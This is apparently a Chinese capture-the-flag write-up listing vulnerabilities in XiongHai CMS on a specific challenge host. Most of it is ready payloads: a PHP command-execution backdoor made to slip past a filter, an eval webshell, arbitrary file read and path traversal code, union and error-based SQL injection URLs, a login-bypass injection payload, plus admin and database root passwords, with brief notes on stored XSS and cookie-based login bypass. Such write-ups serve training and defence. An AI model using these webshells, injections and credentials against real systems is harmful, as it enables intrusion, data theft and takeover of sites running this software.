本题基于熊海cms

熊海cms所有漏洞均存在

#### 后台弱口令

admin    admin123456

#### 数据库统一密码

root    334cc35b3c704593

#### index.php过盾一句话

```php
a=1;$b="a=".$_GET['a'];parse_str($b);print_r(`$a`);
```

http://117.50.66.102:20801/?a=whoami

#### /files/about.php一句话

```php
eval($_REQUEST['shell']);
```

http://117.50.66.102:20801/?r=about&shell=phpinfo();

#### /files/index.php任意文件读取

```php
$file_path = $_GET['path'] ;
if ( file_exists ( $file_path )){
$str = file_get_contents ( $file_path ); //将整个文件内容读入到一个字符串中
$str = str_replace ( "\r\n" , "<br />" , $str );
echo $str ;
}
```

http://117.50.66.102:20801/?r=index&path=/flag.txt

![image-20210714204333120](http://pic.ocean888.cn/image-20210714204333120.png)

#### 任意文件读取

```url
http://117.50.66.102:20801/?r=../web
```

 本来是包含files文件夹下的php文件，通过目录穿越我们尝试包含web.php

![image-20210714195930393](http://pic.ocean888.cn/image-20210714195930393.png)

mariaDB数据库

```url
http://117.50.66.102:20801/admin/?r=editcolumn&type=1&id=1%27%20and%201=2%20union%20select%201,database(),3,4,5,user(),7,8,9,10--+
```

![image-20210714200255532](http://pic.ocean888.cn/image-20210714200255532.png)

#### 前台留言xss

有一个管理员回复，我们到后台界面留言回复，进行XSS攻击。

![img](http://pic.ocean888.cn/1828215-20200504143046721-1009691688.png)

#### 前台多处sql注入

siteset.php、software.php、download.php等

```php
http://117.50.66.102:20801/?r=software&cid=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)#
```

![image-20210714201856175](http://pic.ocean888.cn/image-20210714201856175.png)

#### 后台sql注入

```URL
http://117.50.66.102:20801/admin/?r=editcolumn&type=1&id=1%27
```

![image-20210714200146487](F:\_笔记\mdpic\web2\image-20210714200146487.png)

#### 后台登陆sql注入

![image-20210714202154297](http://pic.ocean888.cn/image-20210714202154297.png)

```php
admin 'and updatexml(1,concat(0x7e,(SELECT group_concat(password) FROM manage),0x7e),1)#
```

利用SQL注入直接登录

**payload:**

```plain
user:1' union select 1,2,'test','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8# 
password:1 
```

check login.php

#### 后台任意用户登录
请求任意后台页面，在http请求中加入cookie信息

![img](http://pic.ocean888.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL2V1WHNZaUdpV2JlT1BwT08ucG5nIXRodW1ibmFpbA)

#### 推荐阅读

https://blog.csdn.net/q20010619/article/details/108046071

